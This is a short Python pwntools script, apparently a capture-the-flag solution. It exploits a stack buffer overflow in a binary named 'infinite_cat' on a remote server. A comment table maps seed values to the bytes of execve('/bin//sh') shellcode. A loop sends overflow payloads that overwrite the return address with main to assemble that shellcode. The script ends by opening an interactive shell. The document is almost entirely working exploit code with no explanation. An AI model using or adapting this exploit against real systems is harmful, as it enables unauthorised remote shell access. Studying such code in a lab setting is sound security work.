from pwn import *
import sys, time
import ctypes

context.binary = "./infinite_cat"
#p = process(["./infinite_cat"])
p = remote("45.32.113.43", "12025")

'''
opcode : 31 : find seed : 146
opcode : f6 : find seed : 525
opcode : 48 : find seed : 31
opcode : bb : find seed : 262
opcode : 2f : find seed : 104
opcode : 62 : find seed : 122
opcode : 69 : find seed : 58
opcode : 6e : find seed : 521
opcode : 2f : find seed : 104
opcode : 2f : find seed : 104
opcode : 73 : find seed : 28
opcode : 68 : find seed : 38
opcode : 56 : find seed : 18
opcode : 53 : find seed : 133
opcode : 54 : find seed : 510
opcode : 5f : find seed : 318
opcode : 6a : find seed : 183
opcode : 3b : find seed : 92
opcode : 58 : find seed : 209
opcode : 31 : find seed : 146
opcode : d2 : find seed : 280
opcode : f : find seed : 256
opcode : 5 : find seed : 84
'''

main = 0x0000000000400AAC

def recursive(exp):
    p.recvuntil("length: ")
    p.sendline("1")
    p.recvuntil("comment?\n")
    p.send(exp)

# make shellcode seed number
seed = [146, 525, 31, 262, 104, 122, 58, 521, 104, 104, 28, 38, 18, 133, 510, 318, 183, 92, 209, 146, 280, 256, 84]
for i in seed:
    exp = "A" * (0x24 - 0x18) + p32(i)
    exp += "B" * (0x34 - 0x8 - len(exp))
    exp += p64(main)
    recursive(exp)

p.interactive()
